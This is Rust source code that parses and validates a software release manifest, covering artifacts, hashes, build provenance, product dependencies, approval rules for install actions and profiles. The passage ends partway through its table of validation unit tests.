//! `release-manifest.json`: the versioned description of a release.

use super::{
    MANIFEST_SCHEMA_VERSION, MAX_NAME_LEN, Os, Product, Profile, Target, file_name_ok,
    is_sha256_hex, rel_path_problem,
};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};

/// A manifest larger than this is refused unread.
pub const MAX_MANIFEST_BYTES: usize = 1024 * 1024;
/// An artifact larger than this is refused.
pub const MAX_ARTIFACT_BYTES: u64 = 2 * 1024 * 1024 * 1024;
const MAX_PRODUCTS: usize = 16;
const MAX_ARTIFACTS: usize = 64;
const MAX_FILES: usize = 64;
const MAX_ACTIONS: usize = 32;
const MAX_ALIASES: usize = 8;
const MAX_PROFILES: usize = 8;
const MAX_TARGETS: usize = 8;
const MAX_DETAIL_LEN: usize = 200;

/// Where a release comes from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ReleaseKind {
    /// A signed release: every product has a hashed artifact for each target.
    Release,
    /// A reviewed-commit source build: no artifacts exist yet.
    SourceBuild,
}

crate::wire::wire_names!(ReleaseKind as release_kind_wire {
    Release => "release",
    SourceBuild => "source_build",
});

/// What one release is.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReleaseInfo {
    /// Digits, letters, `.` and `-`; never `+` (the release directory is
    /// `<version>+<sha12>`).
    pub version: String,
    pub kind: ReleaseKind,
    /// The 40-hex source commit. Required for a signed release.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub commit: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub toolchain: Option<String>,
    /// How a reviewed-commit source build was made (`fl install --from-git`). Only a
    /// `source_build` manifest carries it; it is built in memory and never part of a published
    /// manifest.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub build: Option<BuildProvenance>,
}

/// Longest `rustc -V` / `cargo -V` line a provenance record holds.
pub const MAX_TOOL_LINE: usize = 200;

/// How a source-build release was made. It is recorded in the install receipt and in the
/// release's `release.json`, so a source build never poses as a signed release and an
/// unreviewed commit is visible for as long as it is installed.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct BuildProvenance {
    /// The commit was an ancestor of `origin/main` when it was built. `false` only with
    /// `--allow-unreviewed`.
    pub reviewed: bool,
    /// `rustc -V` of the toolchain that built the binaries.
    pub rustc: String,
    /// `cargo -V` of the same toolchain.
    pub cargo: String,
    /// `<sha12>-<digest12>`: the commit and the first digits of the built tree's digest.
    pub build_id: String,
    /// Unix seconds: the commit time, also the build's `SOURCE_DATE_EPOCH`.
    pub build_time_unix: u64,
}

impl BuildProvenance {
    /// Why this record is not acceptable, if it is not.
    pub fn problem(&self) -> Option<&'static str> {
        let line_ok =
            |s: &str| !s.is_empty() && s.len() <= MAX_TOOL_LINE && !s.chars().any(char::is_control);
        if !line_ok(&self.rustc) {
            Some("build.rustc is empty, too long, or has a control character")
        } else if !line_ok(&self.cargo) {
            Some("build.cargo is empty, too long, or has a control character")
        } else if !file_name_ok(&self.build_id) {
            Some("build.build_id is not an accepted name")
        } else {
            None
        }
    }
}

/// Compatibility metadata, as data. A later phase fills it from the build
/// stamp; nothing here reads a binary.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Compat {
    pub protocol_major: u32,
    /// The oldest store format this release can read.
    pub store_format_min: u32,
    /// The newest store format this release can read.
    pub store_format_max: u32,
}

/// One downloadable, hashed artifact.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Artifact {
    pub id: String,
    pub target: Target,
    /// The archive path, relative.
    pub file: String,
    /// Lowercase hex SHA-256.
    pub sha256: String,
    pub size: u64,
    /// The products whose files this artifact carries.
    pub provides: Vec<String>,
}

/// What a file inside a release is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FileKind {
    Binary,
    AssetDir,
    UnitTemplate,
}

crate::wire::wire_names!(FileKind as file_kind_wire {
    Binary => "binary",
    AssetDir => "asset_dir",
    UnitTemplate => "unit_template",
});

/// A path inside the release directory.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProductFile {
    pub path: String,
    pub kind: FileKind,
}

/// The separate, never-implied actions a product may plan (spec §2).
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ActionKind {
    McpCatalog,
    PathChange,
    RegisterService,
    EnableAtBoot,
    StartListener,
    InitCredentials,
    MigrateState,
}

crate::wire::wire_names!(ActionKind as action_kind_wire {
    McpCatalog => "mcp_catalog",
    PathChange => "path_change",
    RegisterService => "register_service",
    EnableAtBoot => "enable_at_boot",
    StartListener => "start_listener",
    InitCredentials => "init_credentials",
    MigrateState => "migrate_state",
});

impl ActionKind {
    /// Kinds that act on a unit file by its name.
    pub fn names_a_unit(self) -> bool {
        matches!(
            self,
            Self::RegisterService | Self::EnableAtBoot | Self::StartListener
        )
    }

    /// Kinds only an explicit approval may start: never granted by a profile.
    pub fn explicit_only(self) -> bool {
        matches!(self, Self::InitCredentials | Self::MigrateState)
    }
}

/// One action a product may plan.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ActionSpec {
    pub kind: ActionKind,
    /// What it acts on: a unit name, a catalog entry, a store.
    pub subject: String,
    /// Operating systems it applies to; empty = all.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub os: Vec<Os>,
    /// Profiles in which it is planned at all; empty = every profile.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub planned_in: Vec<Profile>,
    /// Profiles whose selection approves it; any other profile needs an
    /// explicit approval. Never set for [`ActionKind::explicit_only`] kinds.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub by_profile: Vec<Profile>,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub detail: String,
}

/// One product's declaration.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProductEntry {
    pub id: String,
    /// Products that must be installed with this one.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub requires: Vec<String>,
    /// Products this one can use when present; absent, its routes answer
    /// `module_not_installed`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub optional: Vec<String>,
    /// The platforms and architectures it supports.
    pub targets: Vec<Target>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<ProductFile>,
    /// Launcher aliases it owns (`agent-msg`, ...).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub aliases: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub actions: Vec<ActionSpec>,
}

impl ProductEntry {
    pub fn product(&self) -> Option<Product> {
        Product::from_wire(&self.id)
    }

    pub fn required_products(&self) -> Vec<Product> {
        self.requires
            .iter()
            .filter_map(|s| Product::from_wire(s))
            .collect()
    }

    pub fn optional_products(&self) -> Vec<Product> {
        self.optional
            .iter()
            .filter_map(|s| Product::from_wire(s))
            .collect()
    }
}

/// A profile's contents: the products a user would see selected. Hidden
/// dependencies are added by the planner.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProfileEntry {
    pub id: Profile,
    pub products: Vec<String>,
}

/// The release manifest.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ReleaseManifest {
    pub schema_version: u32,
    pub release: ReleaseInfo,
    pub compat: Compat,
    #[serde(default)]
    pub artifacts: Vec<Artifact>,
    pub products: Vec<ProductEntry>,
    pub profiles: Vec<ProfileEntry>,
}

/// Why a manifest was refused.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ManifestError {
    #[error("manifest is {bytes} bytes; the limit is {MAX_MANIFEST_BYTES}")]
    TooLarge { bytes: usize },
    #[error("manifest is not valid: {0}")]
    Malformed(String),
    #[error("unsupported schema_version {found}; this release reads {MANIFEST_SCHEMA_VERSION}")]
    UnsupportedSchema { found: u64 },
    #[error("unknown product `{id}` in {context}")]
    UnknownProduct { context: String, id: String },
    #[error("product `{0}` is declared twice")]
    DuplicateProduct(String),
    #[error("required product `{0}` is not declared")]
    MissingProduct(String),
    #[error("`{product}` needs `{dependency}`, which the manifest does not declare or list")]
    MissingDependency { product: String, dependency: String },
    #[error("dependency cycle: {}", .0.join(" -> "))]
    DependencyCycle(Vec<String>),
    #[error("`{product}` lists `{dependency}` as both required and optional")]
    RequiredAndOptional { product: String, dependency: String },
    #[error("artifact `{0}` is declared more than once")]
    DuplicateArtifact(String),
    #[error("{target} has two artifacts for `{product}`")]
    AmbiguousArtifact { target: String, product: String },
    #[error("artifact `{artifact}` has a bad sha256 (need 64 lowercase hex digits)")]
    BadHash { artifact: String },
    #[error("artifact `{artifact}` size {size} is outside 1..={MAX_ARTIFACT_BYTES}")]
    BadSize { artifact: String, size: u64 },
    #[error("{context}: path `{path}` {reason}")]
    BadPath {
        context: String,
        path: String,
        reason: &'static str,
    },
    #[error("{context}: `{value}` is not an accepted name")]
    BadName { context: String, value: String },
    #[error(
        "release version `{0}` is not accepted (letters, digits, `.`, `-`; up to 64; not `.`, `..` or a leading `-`)"
    )]
    BadVersion(String),
    #[error("release commit `{0}` is not a 40-digit lowercase hex sha")]
    BadCommit(String),
    #[error("{what} exceeds the limit of {max}")]
    TooMany { what: &'static str, max: usize },
    #[error("compat: {0}")]
    BadCompat(String),
    #[error("release kind: {0}")]
    ReleaseKind(String),
    #[error("release build provenance: {0}")]
    BadBuild(String),
    #[error("`{product}` {kind} action `{subject}` cannot be approved by a profile")]
    ByProfileForbidden {
        product: String,
        kind: String,
        subject: String,
    },
    #[error("`{product}` action `{subject}` is approved by a profile it is not planned in")]
    ByProfileOutsidePlannedIn { product: String, subject: String },
    #[error("`{product}` declares action {kind} `{subject}` twice")]
    DuplicateAction {
        product: String,
        kind: String,
        subject: String,
    },
    #[error("`{product}` action `{subject}` names a unit the product does not ship")]
    UnitNotShipped { product: String, subject: String },
    #[error("profile `{0}` is declared twice")]
    DuplicateProfile(String),
    #[error("profile `{profile}` does not include required product `{product}`")]
    ProfileMissingRequired { profile: String, product: String },
    #[error("profile `lab` must be a superset of `full`; it lacks {}", .0.join(", "))]
    LabNotSuperset(Vec<String>),
    #[error("`{product}` declares no supported targets")]
    NoTargets { product: String },
}

fn bad_name(context: &str, value: &str) -> ManifestError {
    ManifestError::BadName {
        context: context.to_string(),
        value: value.chars().take(MAX_NAME_LEN).collect(),
    }
}

fn bad_path(context: &str, path: &str, reason: &'static str) -> ManifestError {
    ManifestError::BadPath {
        context: context.to_string(),
        path: path.chars().take(MAX_NAME_LEN).collect(),
        reason,
    }
}

impl ReleaseManifest {
    /// Parse and validate `json`. `schema_version` is read first, so a newer
    /// manifest is reported as unsupported rather than as unknown fields.
    pub fn parse(json: &str) -> Result<Self, Vec<ManifestError>> {
        if json.len() > MAX_MANIFEST_BYTES {
            return Err(vec![ManifestError::TooLarge { bytes: json.len() }]);
        }
        let value: serde_json::Value = serde_json::from_str(json)
            .map_err(|e| vec![ManifestError::Malformed(e.to_string())])?;
        match value.get("schema_version").and_then(|v| v.as_u64()) {
            Some(v) if v == u64::from(MANIFEST_SCHEMA_VERSION) => {}
            Some(found) => return Err(vec![ManifestError::UnsupportedSchema { found }]),
            None => {
                return Err(vec![ManifestError::Malformed(
                    "schema_version is missing or not a number".into(),
                )]);
            }
        }
        let manifest: Self = serde_json::from_value(value)
            .map_err(|e| vec![ManifestError::Malformed(e.to_string())])?;
        manifest.validate()?;
        Ok(manifest)
    }

    /// The manifest as pretty JSON with a trailing newline (field order is the
    /// struct's, so the bytes are stable).
    pub fn to_json(&self) -> String {
        let mut out = serde_json::to_string_pretty(self).expect("manifest serializes");
        out.push('\n');
        out
    }

    pub fn product(&self, p: Product) -> Option<&ProductEntry> {
        self.products.iter().find(|e| e.product() == Some(p))
    }

    /// The resolved products of `profile`, if the manifest declares it.
    pub fn profile_products(&self, profile: Profile) -> Option<BTreeSet<Product>> {
        let entry = self.profiles.iter().find(|e| e.id == profile)?;
        Some(
            entry
                .products
                .iter()
                .filter_map(|s| Product::from_wire(s))
                .collect(),
        )
    }

    /// Every rule the planner relies on. Returns all violations, in a fixed
    /// order.
    pub fn validate(&self) -> Result<(), Vec<ManifestError>> {
        let mut errs: Vec<ManifestError> = Vec::new();
        self.check_header(&mut errs);
        let declared = self.check_products(&mut errs);
        self.check_dependencies(&declared, &mut errs);
        self.check_artifacts(&declared, &mut errs);
        self.check_profiles(&declared, &mut errs);
        if errs.is_empty() { Ok(()) } else { Err(errs) }
    }

    fn check_header(&self, errs: &mut Vec<ManifestError>) {
        if self.schema_version != MANIFEST_SCHEMA_VERSION {
            errs.push(ManifestError::UnsupportedSchema {
                found: u64::from(self.schema_version),
            });
        }
        let v = &self.release.version;
        // The version is a path segment of the release directory and a field of the receipt:
        // it must pass the receipt's own name rule (`file_name_ok`: never `.`, `..` or a
        // leading `-`), so a manifest never produces a receipt that is then refused.
        if v.is_empty()
            || v.len() > 64
            || !v
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-'))
            || !file_name_ok(v)
        {
            errs.push(ManifestError::BadVersion(v.chars().take(64).collect()));
        }
        if let Some(c) = &self.release.commit
            && !(c.len() == 40 && c.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f')))
        {
            errs.push(ManifestError::BadCommit(c.chars().take(64).collect()));
        }
        if let Some(t) = &self.release.toolchain
            && !file_name_ok(t)
        {
            errs.push(bad_name("release.toolchain", t));
        }
        let c = &self.compat;
        if c.store_format_min > c.store_format_max {
            errs.push(ManifestError::BadCompat(format!(
                "store_format_min {} is above store_format_max {}",
                c.store_format_min, c.store_format_max
            )));
        }
        match self.release.kind {
            super::ReleaseKind::Release => {
                if self.release.build.is_some() {
                    errs.push(ManifestError::ReleaseKind(
                        "a signed release carries no source-build provenance".into(),
                    ));
                }
                if self.release.commit.is_none() {
                    errs.push(ManifestError::ReleaseKind(
                        "a signed release names its source commit".into(),
                    ));
                }
                if self.artifacts.is_empty() {
                    errs.push(ManifestError::ReleaseKind(
                        "a signed release lists its artifacts".into(),
                    ));
                }
            }
            super::ReleaseKind::SourceBuild => {
                // A plan-only source-build manifest lists no artifacts. One built from a
                // commit (`fl install --from-git`) names its provenance and exactly the one
                // artifact tree that build produced.
                match &self.release.build {
                    None if !self.artifacts.is_empty() => {
                        errs.push(ManifestError::ReleaseKind(
                            "a source-build manifest has no artifacts unless it names how \
                             they were built"
                                .into(),
                        ));
                    }
                    None => {}
                    Some(b) => {
                        if self.release.commit.is_none() {
                            errs.push(ManifestError::ReleaseKind(
                                "a source build names its source commit".into(),
                            ));
                        }
                        if self.artifacts.len() > 1 {
                            errs.push(ManifestError::ReleaseKind(
                                "a source build lists at most the one artifact it built".into(),
                            ));
                        }
                        if let Some(why) = b.problem() {
                            errs.push(ManifestError::BadBuild(why.into()));
                        }
                    }
                }
            }
        }
    }

    /// Per-product checks; returns the declared products.
    fn check_products(&self, errs: &mut Vec<ManifestError>) -> BTreeSet<Product> {
        if self.products.len() > MAX_PRODUCTS {
            errs.push(ManifestError::TooMany {
                what: "products",
                max: MAX_PRODUCTS,
            });
            return BTreeSet::new();
        }
        let mut declared = BTreeSet::new();
        for e in &self.products {
            let Some(p) = e.product() else {
                errs.push(ManifestError::UnknownProduct {
                    context: "products".into(),
                    id: e.id.chars().take(MAX_NAME_LEN).collect(),
                });
                continue;
            };
            if !declared.insert(p) {
                errs.push(ManifestError::DuplicateProduct(e.id.clone()));
                continue;
            }
            self.check_product_entry(p, e, errs);
        }
        for must in [Product::Ferroloop, Product::Ferrostore] {
            if !declared.contains(&must) {
                errs.push(ManifestError::MissingProduct(must.to_string()));
            }
        }
        declared
    }

    fn check_product_entry(&self, p: Product, e: &ProductEntry, errs: &mut Vec<ManifestError>) {
        let id = p.as_wire();
        if e.targets.is_empty() {
            errs.push(ManifestError::NoTargets { product: id.into() });
        }
        if e.targets.len() > MAX_TARGETS {
            errs.push(ManifestError::TooMany {
                what: "targets per product",
                max: MAX_TARGETS,
            });
        }
        if e.files.len() > MAX_FILES {
            errs.push(ManifestError::TooMany {
                what: "files per product",
                max: MAX_FILES,
            });
        }
        if e.aliases.len() > MAX_ALIASES {
            errs.push(ManifestError::TooMany {
                what: "aliases per product",
                max: MAX_ALIASES,
            });
        }
        if e.actions.len() > MAX_ACTIONS {
            errs.push(ManifestError::TooMany {
                what: "actions per product",
                max: MAX_ACTIONS,
            });
        }
        let ctx = format!("{id}.files");
        for f in e.files.iter().take(MAX_FILES) {
            if let Some(reason) = rel_path_problem(&f.path) {
                errs.push(bad_path(&ctx, &f.path, reason));
            }
        }
        for a in e.aliases.iter().take(MAX_ALIASES) {
            if !file_name_ok(a) || a == "fl" {
                errs.push(bad_name(&format!("{id}.aliases"), a));
            }
        }
        let mut seen = BTreeSet::new();
        for a in e.actions.iter().take(MAX_ACTIONS) {
            let kind = a.kind.as_wire();
            if !file_name_ok(&a.subject) {
                errs.push(bad_name(&format!("{id}.actions.subject"), &a.subject));
                continue;
            }
            if !seen.insert((a.kind, a.subject.clone())) {
                errs.push(ManifestError::DuplicateAction {
                    product: id.into(),
                    kind: kind.into(),
                    subject: a.subject.clone(),
                });
            }
            if a.detail.len() > MAX_DETAIL_LEN || a.detail.chars().any(char::is_control) {
                errs.push(bad_name(&format!("{id}.actions.detail"), &a.detail));
            }
            if a.kind.explicit_only() && !a.by_profile.is_empty() {
                errs.push(ManifestError::ByProfileForbidden {
                    product: id.into(),
                    kind: kind.into(),
                    subject: a.subject.clone(),
                });
            }
            if !a.planned_in.is_empty() && a.by_profile.iter().any(|p| !a.planned_in.contains(p)) {
                errs.push(ManifestError::ByProfileOutsidePlannedIn {
                    product: id.into(),
                    subject: a.subject.clone(),
                });
            }
            if a.kind == super::ActionKind::RegisterService {
                let wanted = format!("contrib/units/{}", a.subject);
                let shipped = e
                    .files
                    .iter()
                    .any(|f| f.kind == FileKind::UnitTemplate && f.path == wanted);
                if !shipped {
                    errs.push(ManifestError::UnitNotShipped {
                        product: id.into(),
                        subject: a.subject.clone(),
                    });
                }
            }
        }
    }

    fn check_dependencies(&self, declared: &BTreeSet<Product>, errs: &mut Vec<ManifestError>) {
        let mut edges: BTreeMap<Product, Vec<Product>> = BTreeMap::new();
        for e in &self.products {
            let Some(p) = e.product() else { continue };
            let mut seen_req = BTreeSet::new();
            for (list, name) in [(&e.requires, "requires"), (&e.optional, "optional")] {
                for dep in list.iter().take(MAX_PRODUCTS) {
                    let Some(d) = Product::from_wire(dep) else {
                        errs.push(ManifestError::UnknownProduct {
                            context: format!("{}.{name}", p.as_wire()),
                            id: dep.chars().take(MAX_NAME_LEN).collect(),
                        });
                        continue;
                    };
                    if !declared.contains(&d) {
                        errs.push(ManifestError::MissingDependency {
                            product: p.to_string(),
                            dependency: d.to_string(),
                        });
                    }
                    if name == "requires" {
                        seen_req.insert(d);
                        edges.entry(p).or_default().push(d);
                    } else if d == p {
                        errs.push(ManifestError::DependencyCycle(vec![
                            p.to_string(),
                            p.to_string(),
                        ]));
                    } else if e.requires.iter().any(|r| r == dep) {
                        errs.push(ManifestError::RequiredAndOptional {
                            product: p.to_string(),
                            dependency: d.to_string(),
                        });
                    }
                }
            }
            if p == Product::Ferroloop && !seen_req.contains(&Product::Ferrostore) {
                errs.push(ManifestError::MissingDependency {
                    product: p.to_string(),
                    dependency: Product::Ferrostore.to_string(),
                });
            }
        }
        if let Some(cycle) = find_cycle(&edges) {
            errs.push(ManifestError::DependencyCycle(cycle));
        }
    }

    fn check_artifacts(&self, declared: &BTreeSet<Product>, errs: &mut Vec<ManifestError>) {
        if self.artifacts.len() > MAX_ARTIFACTS {
            errs.push(ManifestError::TooMany {
                what: "artifacts",
                max: MAX_ARTIFACTS,
            });
            return;
        }
        let mut ids = BTreeSet::new();
        let mut files = BTreeSet::new();
        let mut provided: BTreeMap<(Target, Product), usize> = BTreeMap::new();
        for a in &self.artifacts {
            let mut duplicate = false;
            if !file_name_ok(&a.id) {
                errs.push(bad_name("artifacts.id", &a.id));
            } else if !ids.insert(a.id.clone()) {
                duplicate = true;
                errs.push(ManifestError::DuplicateArtifact(a.id.clone()));
            }
            if !files.insert((a.target, a.file.clone())) && !duplicate {
                errs.push(ManifestError::DuplicateArtifact(
                    a.file.chars().take(MAX_NAME_LEN).collect(),
                ));
            }
            if let Some(reason) = rel_path_problem(&a.file) {
                errs.push(bad_path("artifacts.file", &a.file, reason));
            }
            if !is_sha256_hex(&a.sha256) {
                errs.push(ManifestError::BadHash {
                    artifact: a.id.chars().take(MAX_NAME_LEN).collect(),
                });
            }
            if a.size == 0 || a.size > MAX_ARTIFACT_BYTES {
                errs.push(ManifestError::BadSize {
                    artifact: a.id.chars().take(MAX_NAME_LEN).collect(),
                    size: a.size,
                });
            }
            if a.provides.is_empty() {
                errs.push(bad_name("artifacts.provides", ""));
            }
            for s in a.provides.iter().take(MAX_PRODUCTS) {
                match Product::from_wire(s) {
                    None => errs.push(ManifestError::UnknownProduct {
                        context: format!(
                            "artifact {}",
                            a.id.chars().take(MAX_NAME_LEN).collect::<String>()
                        ),
                        id: s.chars().take(MAX_NAME_LEN).collect(),
                    }),
                    Some(p) => {
                        if !declared.contains(&p) {
                            errs.push(ManifestError::MissingProduct(p.to_string()));
                        }
                        *provided.entry((a.target, p)).or_default() += 1;
                    }
                }
            }
        }
        for ((target, product), n) in provided {
            if n > 1 {
                errs.push(ManifestError::AmbiguousArtifact {
                    target: target.to_string(),
                    product: product.to_string(),
                });
            }
        }
    }

    fn check_profiles(&self, declared: &BTreeSet<Product>, errs: &mut Vec<ManifestError>) {
        if self.profiles.len() > MAX_PROFILES {
            errs.push(ManifestError::TooMany {
                what: "profiles",
                max: MAX_PROFILES,
            });
            return;
        }
        let mut seen = BTreeSet::new();
        let mut resolved: BTreeMap<Profile, BTreeSet<Product>> = BTreeMap::new();
        for pe in &self.profiles {
            if !seen.insert(pe.id) {
                errs.push(ManifestError::DuplicateProfile(pe.id.to_string()));
                continue;
            }
            let mut set = BTreeSet::new();
            for s in pe.products.iter().take(MAX_PRODUCTS) {
                match Product::from_wire(s) {
                    None => errs.push(ManifestError::UnknownProduct {
                        context: format!("profile {}", pe.id),
                        id: s.chars().take(MAX_NAME_LEN).collect(),
                    }),
                    Some(p) => {
                        if !declared.contains(&p) {
                            errs.push(ManifestError::MissingProduct(p.to_string()));
                        }
                        set.insert(p);
                    }
                }
            }
            for req in Product::ALL.iter().filter(|p| p.is_required()) {
                if !set.contains(req) {
                    errs.push(ManifestError::ProfileMissingRequired {
                        profile: pe.id.to_string(),
                        product: req.to_string(),
                    });
                }
            }
            resolved.insert(pe.id, set);
        }
        if let (Some(full), Some(lab)) = (resolved.get(&Profile::Full), resolved.get(&Profile::Lab))
        {
            let missing: Vec<String> = full.difference(lab).map(|p| p.to_string()).collect();
            if !missing.is_empty() {
                errs.push(ManifestError::LabNotSuperset(missing));
            }
        }
        if let (Some(_), Some(_)) = (resolved.get(&Profile::Full), resolved.get(&Profile::Lab)) {
            // `lab` must also plan every action `full` plans.
            for e in &self.products {
                for a in &e.actions {
                    let in_profile =
                        |p: Profile| a.planned_in.is_empty() || a.planned_in.contains(&p);
                    if in_profile(Profile::Full) && !in_profile(Profile::Lab) {
                        errs.push(ManifestError::LabNotSuperset(vec![format!(
                            "{}:{}:{}",
                            e.id,
                            a.kind.as_wire(),
                            a.subject
                        )]));
                    }
                }
            }
        }
    }
}

/// A dependency cycle, as the path that closes it, if one exists.
fn find_cycle(edges: &BTreeMap<Product, Vec<Product>>) -> Option<Vec<String>> {
    fn visit(
        p: Product,
        edges: &BTreeMap<Product, Vec<Product>>,
        done: &mut BTreeSet<Product>,
        stack: &mut Vec<Product>,
    ) -> Option<Vec<String>> {
        if let Some(at) = stack.iter().position(|s| *s == p) {
            let mut path: Vec<String> = stack[at..].iter().map(|s| s.to_string()).collect();
            path.push(p.to_string());
            return Some(path);
        }
        if done.contains(&p) {
            return None;
        }
        stack.push(p);
        for d in edges.get(&p).into_iter().flatten() {
            if let Some(c) = visit(*d, edges, done, stack) {
                return Some(c);
            }
        }
        stack.pop();
        done.insert(p);
        None
    }
    let mut done = BTreeSet::new();
    for p in edges.keys() {
        if let Some(c) = visit(*p, edges, &mut done, &mut Vec::new()) {
            return Some(c);
        }
    }
    None
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::install::{Arch, default_manifest};

    pub(crate) fn linux() -> Target {
        Target {
            os: Os::Linux,
            arch: Arch::X86_64,
        }
    }

    /// The default manifest turned into a signed release for linux/x86_64.
    pub(crate) fn signed_manifest() -> ReleaseManifest {
        let mut m = default_manifest();
        m.release.kind = ReleaseKind::Release;
        m.release.commit = Some("0123456789abcdef0123456789abcdef01234567".into());
        m.artifacts = vec![Artifact {
            id: "fl-linux-x86_64".into(),
            target: linux(),
            file: "fl-linux-x86_64.tar.zst".into(),
            sha256: "a".repeat(64),
            size: 1000,
            provides: Product::ALL.iter().map(|p| p.to_string()).collect(),
        }];
        m
    }

    #[test]
    fn the_default_manifest_is_valid_and_round_trips() {
        let m = default_manifest();
        m.validate().expect("valid");
        let json = m.to_json();
        let back = ReleaseManifest::parse(&json).expect("parses");
        assert_eq!(back, m);
        assert_eq!(back.to_json(), json);
        signed_manifest().validate().expect("signed variant valid");
    }

    type Mutate = fn(&mut ReleaseManifest);
    type Expect = fn(&ManifestError) -> bool;

    #[test]
    fn manifest_validation_table() {
        let cases: Vec<(&str, Mutate, Expect)> = vec![
            (
                "unknown product entry",
                |m| m.products[3].id = "ferroflow".into(),
                |e| matches!(e, ManifestError::UnknownProduct { id, .. } if id == "ferroflow"),
            ),
            (
                "unknown product in requires",
                |m| m.products[2].requires.push("nope".into()),
                |e| matches!(e, ManifestError::UnknownProduct { id, .. } if id == "nope"),
            ),
            (
                "unknown product in a profile",
                |m| m.profiles[0].products.push("ferroarch".into()),
                |e| matches!(e, ManifestError::UnknownProduct { id, .. } if id == "ferroarch"),
            ),
            (
                "duplicate product",
                |m| {
                    let dup = m.products[2].clone();
                    m.products.push(dup);
                },
                |e| matches!(e, ManifestError::DuplicateProduct(_)),
            ),
            (
                "missing ferroloop",
                |m| m.products.retain(|p| p.id != "ferroloop"),
                |e| matches!(e, ManifestError::MissingProduct(p) if p == "ferroloop"),
            ),
            (
                "missing dependency",
                |m| m.products.retain(|p| p.id != "ferrowatch"),
                |e| {
                    matches!(e, ManifestError::MissingDependency { product, dependency }
                    if product == "ferrodeck" && dependency == "ferrowatch")
                },
            ),
            (
                "ferroloop must need the store",
                |m| m.products[0].requires.clear(),
                |e| {
                    matches!(e, ManifestError::MissingDependency { product, dependency }
                    if product == "ferroloop" && dependency == "ferrostore")
                },
            ),
            (
                "dependency cycle",
                |m| m.products[1].requires.push("ferroloop".into()),
                |e| matches!(e, ManifestError::DependencyCycle(c) if c.first() == c.last() && c.len() >= 3),
            ),
            (
                "self dependency",
                |m| m.products[2].requires.push("ferrowire".into()),
                |e| matches!(e, ManifestError::DependencyCycle(_)),
            ),
            (
                "required and optional",
                |m| m.products[7].optional.push("ferrowire".into()),
                |e| matches!(e, ManifestError::RequiredAndOptional { .. }),
            ),
            (
                "no targets",
                |m| m.products[2].targets.clear(),
                |e| matches!(e, ManifestError::NoTargets { .. }),
            ),
            (
                "absolute product file",
                |m| m.products[0].files[0].path = "/usr/bin/fl".into(),
                |e| matches!(e, ManifestError::BadPath { reason, .. } if reason.contains("absolute")),
            ),
            (
                "dotdot product file",
                |m| m.products[0].files[0].path = "bin/../../x".into(),
                |e| matches!(e, ManifestError::BadPath { reason, .. } if reason.contains("..")),
            ),
            (
                "nul product file",
                |m| m.products[0].files[0].path = "bin/f\0l".into(),
                |e| matches!(e, ManifestError::BadPath { reason, .. } if reason.contains("NUL")),
            ),
            (
                "long product file",
                |m| m.products[0].files[0].path = "a".repeat(300),
                |e| matches!(e, ManifestError::BadPath { reason, .. } if reason.contains("long")),
            ),
            (
                "alias named fl",
                |m| m.products[2].aliases.push("fl".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias with a slash",
                |m| m.products[2].aliases.push("a/b".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias dot",
                |m| m.products[2].aliases.push(".".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias dotdot",
                |m| m.products[2].aliases.push("..".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias leading dash",
                |m| m.products[2].aliases.push("-x".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias with a NUL",
                |m| m.products[2].aliases.push("a\0b".into()),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "alias too long",
                |m| m.products[2].aliases.push("a".repeat(81)),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "unit subject dotdot",
                |m| m.products[2].actions[0].subject = "..".into(),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "unit subject with a slash",
                |m| m.products[2].actions[0].subject = "../x.service".into(),
                |e| matches!(e, ManifestError::BadName { .. }),
            ),
            (
                "unit subject leading dash",
